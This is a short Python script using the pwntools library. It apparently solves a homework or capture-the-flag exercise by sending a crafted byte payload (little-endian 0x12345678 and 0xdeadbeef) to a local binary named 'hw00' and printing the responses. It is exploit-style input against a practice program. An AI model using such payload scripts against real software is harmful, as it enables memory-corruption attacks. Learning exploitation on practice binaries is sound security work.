#!/usr/bin/env python3

from pwn import *
p = process("./hw00")
print(p.recv())
p.sendline("\x78\x56\x34\x12\xef\xbe\xad\xde")
print(p.recv())
